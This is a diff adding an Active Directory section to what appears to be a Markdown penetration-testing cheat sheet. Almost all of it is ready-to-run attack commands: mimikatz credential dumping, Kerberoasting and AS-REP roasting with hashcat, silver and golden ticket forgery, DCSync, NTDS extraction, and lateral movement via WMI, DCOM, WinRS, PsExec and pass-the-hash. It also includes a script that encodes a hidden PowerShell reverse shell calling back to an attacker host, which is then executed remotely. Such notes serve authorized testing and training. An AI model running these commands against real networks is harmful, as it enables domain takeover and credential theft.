@@ -122,7 +122,8 @@ Thank you for reading.
 	- [Exploitation Tools](#exploitation-tools-1)
 		- [Metasploit](#metasploit)
 	- [Post Exploitation](#post-exploitation-1)
- 		- [Abusing Account Operators Group Membership](#abusing-account-operators-group-membership)
+ 		- [Account Operators Group Membership](#account-operators-group-membership)
+ 		- [Active Directory](#active-directory)
  		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
 		- [ADCSTemplate](#adcstemplate)
   		- [ADMiner](#adminer)
@@ -2883,6 +2884,341 @@ Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=local" -Pr
 
 ```c
 impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
+```
+
+#### Active Directory
+
+##### Manual Enumeration
+
+```c
+net user /domain
+net user <USERNAME> /domain
+net group /domain
+net group "<GROUP>" /domain
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+Find-LocalAdminAccess
+Get-NetSession -ComputerName <RHOST>
+Get-NetSession -ComputerName <RHOST> -Verbose
+Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+```
+
+##### Enumeration using PowerView
+
+```c
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-NetDomain
+Get-NetUser
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+Get-NetGroup | select cn
+Get-NetGroup "<GROUP>" | select member
+Convert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104
+```
+
+##### Service Principal Name (SPN) Enumeration
+
+```c
+setspn -L iis_service
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+nslookup.exe <RHOST>
+```
+
+##### Object Permission Enumeration
+
+| Permission | Description |
+| --- | --- |
+| GenericAll | Full permissions on object |
+| GenericWrite | Edit certain attributes on the object |
+| WriteOwner | Change ownership of the object |
+| WriteDACL | Edit ACE's applied to object |
+| AllExtendedRights | Change password, reset password, etc. |
+| ForceChangePassword | Password change for object |
+| Self (Self-Membership) | Add ourselves to for example a group |
+
+```c
+Get-ObjectAcl -Identity <USERNAME>
+Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+Get-NetGroup "<GROUP>" | select member
+net group "<GROUP>" <USERNAME> /add /domain
+net group "<GROUP>" <USERNAME> /del /domain
+```
+
+##### Share Enumeration
+
+```c
+Find-DomainShare
+ls \\<RHOST>\sysvol\<DOMAIN>\
+ls \\<RHOST>\sysvol\<DOMAIN>\Policies\
+cat \\<RHOST>\sysvol\<DOMAIN>\Policies\oldpolicy\old-policy-backup.xml
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vgepPfsN1zMFTiQuyApgR92JE"
+```
+
+##### Credential Harvesting
+
+###### Cached Credentials
+
+```c
+.\mimikatz.exe
+mimikatz # sekurlsa::logonpasswords
+dir \\<RHOST>\<SHARE>
+mimikatz # sekurlsa::tickets
+```
+
+###### AS-REP Roasting
+
+```c
+impacket-GetNPUsers -dc-ip <RHOST> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+```c
+.\Rubeus.exe asreproast /nowrap
+hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+###### Kerberoasting
+
+```c
+impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+```c
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+###### Silver Tickets
+
+###### Prerequisites
+
+- SPN password hash
+- Domain SID
+- Target SPN
+
+###### Silver Ticket Forgery
+
+```c
+iwr -UseDefaultCredentials http://<RHOST>
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords    // NTLM: 4d28cf5252d39971419580a51484ca09
+whoami /user                   // SID: S-1-5-21-1987370270-658905905-1781884369-1105 (S-1-5-21-1987370270-658905905-1781884369)
+mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:<USERNAME>
+klist
+iwr -UseDefaultCredentials http://<RHOST>
+```
+
+###### Domain Controller Syncronization (DCSync)
+
+###### Prerequisites
+
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered
+
+###### Domain Controller Synchonization Execution
+
+```c
+PS C:\> .\mimikatz.exe
+mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>
+mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
+hashcat -m 1000 <FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+```c
+impacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>
+```
+
+##### Lateral Movement
+
+###### Windows Management Instrumentation (WMI)
+
+###### Spawning Process
+
+```c
+wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
+```
+
+###### Store Credentials
+
+```c
+$username = '<USERNAME>';
+$password = '<PASSWORD>';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+```
+
+###### Instanciate Distributed Component Object MOdel (DCOM)
+
+```c
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
+$command = 'cmd';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+###### Creating Payload
+
+###### revshell_encoder.py
+
+```c
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+```
+
+###### Payload Encoding
+
+```c
+python3 encode.py
+```
+
+```c
+powershell -nop -w hidden -e JAB<--- SNIP --->CkA
+```
+
+###### Execution
+
+```c
+$username = '<USERNAME>';
+$password = '<PASSWORD>';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options 
+$command = 'powershell -nop -w hidden -e JAB<--- SNIP --->CkA';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+###### Windows Remote Shell (WinRS)
+
+###### Prerequisites
+
+- User needs to be part of the Administrators or Remote Management Users group on the target host
+
+###### Execution
+
+```c
+C:\> winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
+C:\> winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
+```
+
+###### PowerShell
+
+```c
+$username = '<USERNAME>';
+$password = '<PASSWORD>';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName <RHOST> -Credential $credential
+Enter-PSSession 1
+```
+
+###### PsExec
+
+```c
+.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
+```
+
+###### Pass the Hash (PtH)
+
+```c
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
+```
+
+###### Overpass the Hash
+
+```c
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+klist
+dir \\<RHOST>\<SHARE>
+klist
+.\PsExec.exe \\<RHOST> cmd
+```
+
+###### Pass the Ticket
+
+###### Prerequisites
+
+- Export an already existing ticket of a user
+
+###### Exporting the Ticket
+
+```c
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz #sekurlsa::tickets /export
+dir *.kirbi
+mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-<USERNAME>@cifs-<RHOST>.kirbi
+klist
+.\PsExec.exe \\<RHOST> cmd
+```
+
+###### Distributed Component Object Model (DCOM)
+
+###### Prerequisites
+
+- Elevated PowerShell session
+
+###### Creating and storing the Distributed Component Object Model
+
+```c
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<RHOST>"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c cmd","7")
+tasklist | findstr "cmd"
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB<--- SNIP --->CkA","7")
+```
+
+##### Active Directory Persistence
+
+###### Golden Tickets
+
+###### Prerequisites
+
+- Hash of krbtgt
+
+###### Forge and Inject Golden Ticket
+
+```c
+.\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+mimikatz # misc::cmd
+```
+
+###### Execution
+
+Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.
+
+```c
+.\PsExec.exe \\<RHOST> cmd
+```
+
+###### Volume Shadow Service (VSS) aka Shadow Copies
+
+> https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/
+
+###### Create and collect necessary Files
+
+```c
+vshadow.exe -nw -p  C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
+reg.exe save hklm\system C:\system.bak
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
 #### Active Directory Certificate Services (AD CS)
